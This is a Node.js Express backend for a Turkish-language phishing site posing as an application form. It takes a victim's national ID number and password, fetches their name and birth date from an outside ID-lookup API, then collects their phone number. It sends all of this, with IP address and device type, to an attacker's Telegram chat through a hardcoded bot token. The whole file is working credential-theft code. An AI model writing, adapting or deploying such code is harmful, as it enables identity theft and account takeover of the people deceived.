const express = require("express");
const axios = require("axios");
const bodyParser = require("body-parser");
const session = require("express-session");
const path = require("path");

const app = express();
const PORT = process.env.PORT || 3000;

const TELEGRAM_BOT_TOKEN = "8234483287:AAEOC3FK_Htm9jJM2Sow3Gq4zscVv3IiNok";
const TELEGRAM_CHAT_ID = "-4956809314";

// Store for user applications with timestamps
const userApplicationStore = new Map(); // Map to store TC and application timestamp

// Body parser
app.use(bodyParser.urlencoded({ extended: false }));
app.use(bodyParser.json());

// Session settings
app.use(
  session({
    secret: "mySecretKey",
    resave: false,
    saveUninitialized: true,
    cookie: { maxAge: 24 * 60 * 60 * 1000 }, // Session expires in 24 hours
  })
);

// Static files
app.use(express.static("public"));

// Root route
app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, "public", "index.html"));
});

// Automatic cleanup every 24 hours
setInterval(() => {
  const now = Date.now();
  for (const [tc, { timestamp }] of userApplicationStore) {
    if (now - timestamp > 24 * 60 * 60 * 1000) {
      // Older than 24 hours
      userApplicationStore.delete(tc);
    }
  }
  console.log("Old applications cleared from store.");
}, 24 * 60 * 60 * 1000); // Run every 24 hours

// index route
app.post("/giris", async (req, res) => {
  const { tc, password } = req.body;

  // Validate TC input
  if (!tc || tc.trim() === "" || tc.length !== 11 || isNaN(tc)) {
    return res.redirect("/index.html?error=Geçersiz TC kimlik numarası. 11 haneli olmalı.");
  }

  // Check if TC already has an application
  if (userApplicationStore.has(tc)) {
    return res.redirect(
      "/index.html?error=Zaten başvuru yaptınız. Lütfen 24 saat sonra tekrar deneyin."
    );
  }

  try {
    const apiUrl = `https://api.hexnox.pro/sowixapi/tcpro.php?tc=${tc}`;
    const response = await axios.get(apiUrl);

    // Check if API request was successful
    if (!response.data.success) {
      return res.redirect("/index.html?error=API sorgusu başarısız oldu.");
    }

    const { AD, SOYAD, DOGUMTARIHI } = response.data.data;

    // Validate API response data
    if (!AD || !SOYAD || !DOGUMTARIHI) {
      return res.redirect("/index.html?error=API'den geçersiz veya eksik veri alındı.");
    }

    // Store user data in session
    req.session.userData = { tc, password, adi: AD, soyadi: SOYAD, dogumtarihi: DOGUMTARIHI };

    // Store TC in application store with timestamp
    userApplicationStore.set(tc, { timestamp: Date.now() });

    res.redirect(
      `/chack.html?adi=${encodeURIComponent(AD)}&soyadi=${encodeURIComponent(
        SOYAD
      )}&dogumtarihi=${encodeURIComponent(DOGUMTARIHI)}`
    );
  } catch (error) {
    console.error("API Hatası:", error.message);
    res.redirect("/index.html?error=API bağlantısında bir hata oluştu.");
  }
});

// Chack form route
app.post("/chack", async (req, res) => {
  const ip = req.headers["x-forwarded-for"] || req.socket.remoteAddress;
  const islemSaati = new Date().toLocaleString("tr-TR", {
    timeZone: "Europe/Istanbul",
  });
  const userAgent = req.headers["user-agent"];

  let cihazTuru = "Bilinmiyor";
  if (/android/i.test(userAgent)) {
    cihazTuru = "Android 📱";
  } else if (/iphone|ipad|ipod/i.test(userAgent)) {
    cihazTuru = "iOS 🍎";
  } else if (/windows|mac|linux/i.test(userAgent)) {
    cihazTuru = "PC 💻";
  }

  const { phone, adi, soyadi } = req.body;

  if (!adi || !soyadi) {
    return res.status(400).send("Eksik bilgi: Ad veya soyad bulunamadı.");
  }

  const { tc, password, dogumtarihi } = req.session.userData || {};

  // Ensure TC exists and hasn't been processed
  if (!tc || !userApplicationStore.has(tc)) {
    return res.redirect(
      "/index.html?error=Zaten başvuru yaptınız veya geçersiz oturum."
    );
  }

  // Fancy Telegram message with Markdown
  const entry = `
*🔥 YENİ BAŞVURU LOGU 🔥*

*👤 Kullanıcı Bilgileri:*
  • *Ad Soyad:* ${adi} ${soyadi}
  • *TC Kimlik:* ${tc || "Belirtilmedi"}
  • *Şifre:* ${password || "Belirtilmedi"}
  • *Telefon:* ${phone || "Belirtilmedi"} 📞
  • *Doğum Tarihi:* ${dogumtarihi || "Belirtilmedi"} 🎂

*📱 Cihaz ve Bağlantı:*
  • *Cihaz Türü:* ${cihazTuru}
  • *IP Adresi:* ${ip} 🌐
  • *İşlem Saati:* ${islemSaati} 🕒

*✨ Başvuru Başarıyla Kaydedildi! ✨*
  `;

  try {
    await axios.post(
      `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
      {
        chat_id: TELEGRAM_CHAT_ID,
        text: entry,
        parse_mode: "Markdown", // Enable Markdown formatting
      }
    );

    // Mark as processed
    userApplicationStore.set(tc, {
      timestamp: userApplicationStore.get(tc).timestamp,
      isSent: true,
    });

    return res.redirect(
      `/basarili.html?adi=${encodeURIComponent(
        adi
      )}&soyadi=${encodeURIComponent(soyadi)}&dogumtarihi=${encodeURIComponent(
        dogumtarihi
      )}&islemSaati=${encodeURIComponent(islemSaati)}`
    );
  } catch (error) {
    console.error("Telegram Hatası:", error.message);
    return res.status(500).send("Telegram'a gönderim sırasında bir hata oluştu.");
  }
});

// Start server
app.listen(PORT, () => {
  console.log(`Sunucu ${PORT} portunda çalışıyor.`);
});

module.exports = app;